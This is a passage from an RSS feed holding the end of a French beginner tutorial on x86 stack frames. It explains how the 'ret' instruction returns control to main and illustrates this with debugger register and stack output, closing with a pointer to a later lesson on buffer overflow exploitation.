&lt;p&gt;Par la suite, l&amp;rsquo;instruction &amp;ldquo;ret&amp;rdquo; (pour return) va permettre de reprendre l&amp;rsquo;exécution de la fonction &amp;ldquo;main&amp;rdquo; et ceci est possible parce que EIP a été empilé sur la pile (en rouge sur le schéma) par l&amp;rsquo;instruction &amp;ldquo;call&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;L&amp;rsquo;instruction &amp;ldquo;ret&amp;rdquo; est équivalente à ceci :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jmp    DWORD PTR [esp]	; saute à la valeur (adresse) présente sur le haut de la pile
add    esp,0x4 					; ajoute 4 à esp
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;Et voilà, la stack frame de main a été restaurée correctement et nous avons repris l&amp;rsquo;exécution de main là où on s&amp;rsquo;était arrêté au moment du &amp;ldquo;call&amp;rdquo; (main+29) :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[----------------------------------registers-----------------------------------]
EBP: 0xffffc578 --&amp;gt; 0x0 
ESP: 0xffffc560 --&amp;gt; 0x4 
EIP: 0x8048478 (&amp;lt;main+29&amp;gt;:	add    esp,0x10)
[-------------------------------------code-------------------------------------]
   0x804846f &amp;lt;main+20&amp;gt;:	push   0x8
   0x8048471 &amp;lt;main+22&amp;gt;:	push   0x4
   0x8048473 &amp;lt;main+24&amp;gt;:	call   0x8048436 &amp;lt;addition&amp;gt;
=&amp;gt; 0x8048478 &amp;lt;main+29&amp;gt;:	add    esp,0x10
[------------------------------------stack-------------------------------------]
0000| 0xffffc560 --&amp;gt; 0x4 
0004| 0xffffc564 --&amp;gt; 0x8
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/stack_call.gif&#34; alt=&#34;stack call&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;le-mot-de-la-fin&#34;&gt;Le mot de la fin&lt;/h3&gt;

&lt;p&gt;J&amp;rsquo;espère que ce tuto d&amp;rsquo;initiation sur les failles systèmes vous aura plu et que vous l&amp;rsquo;avez compris dans sa globalité. Si vous l&amp;rsquo;avez apprécié, n&amp;rsquo;hésitez pas à mettre un petit &amp;ldquo;j&amp;rsquo;aime&amp;rdquo; en bas de la page. Si vous avez des questions sur une partie que vous n&amp;rsquo;avez pas comprise ou tout simplement envie de partager votre avis, n&amp;rsquo;hésitez pas à commenter la page. Et même (surtout) si j&amp;rsquo;ai fait une boulette.&lt;/p&gt;

&lt;p&gt;Maintenant vous êtes prêt à passer à la suite, l&amp;rsquo;exploitation d&amp;rsquo;un buffer overflow :)&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>